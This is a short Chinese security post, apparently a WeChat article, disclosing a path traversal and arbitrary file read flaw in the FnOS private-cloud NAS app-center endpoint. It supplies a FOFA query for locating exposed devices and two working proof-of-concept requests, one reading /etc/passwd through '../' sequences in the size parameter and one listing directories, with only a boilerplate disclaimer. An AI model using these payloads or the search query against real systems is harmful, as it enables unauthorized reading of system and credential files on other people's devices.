#  飞牛 FnOS myapp存在目录遍历、文件读取漏洞  
原创 安羽安全
                    安羽安全  安羽安全   2026-02-06 05:22  
  
**01****免责声明：**  
  
文章内容仅供日常学习使用，请勿非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，由使用者承担全部法律及连带责任，作者及发布者不承担任何法律及连带责任。如有内容争议或侵权，我们会及时删除。  
  
**02    漏洞描述**  
  
漏洞接口：  
/app-center-static/serviceicon/myapp/   
存在  
任意文件读取漏洞和目录遍历  
，可以读取系统  
敏感信息  
。  
  
**fofa：app="飞牛-私有云fnOS"**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h29PqzMrB7usUz8CdFlBdh2y6ZXny4xIbYdQVpwIEOAWHS2yq5HetvoUhBViaIYHgCRvN7zNzFQOW8cmjMyLZS8TcqvEoIvGONtPNUXj7CiaQ/640?wx_fmt=png&from=appmsg "")  
## 03    漏洞复现   
  
1、访问系统  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h29PqzMrB7sc6JCIVXyWDutz3ibwibjicib0JqOPgoy5Q21AIoOVnIGI1uOHgtdyxTKFQSSqIiauibwe2j1ku1iaJ9gxGUIftcrXdPKOosHBA7Jyhs/640?wx_fmt=png&from=appmsg "")  
  
2  
、漏洞poc1 文件读取  
```
http://127.0.0.1/app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../etc/passwd
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/h29PqzMrB7uMfxuicUo2YFSZmbv0I2mjB5rTNSETm7hH5Zbw52WWXxtblpI1pyDubVibb1iagCEN2LLtJeI6Ls9Ou53WAr9icGXgGjAxPzF3xT8/640?wx_fmt=png&from=appmsg "")  
  
3、漏洞poc2 目录遍历  
```
多个路径
/app-center-static/serviceicon/trim.media/
/app-center-static/xxx/xx/

/app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h29PqzMrB7uIicSBBRiciaMBH6rJECULia6ICuwOAQwCXKI2tVPJBtd32EibES2esACghO2cHzHg2d7pZDWxz1mSw6zs6RkzITKJBGWc5q7SjgAs/640?wx_fmt=png&from=appmsg "")  
  
  
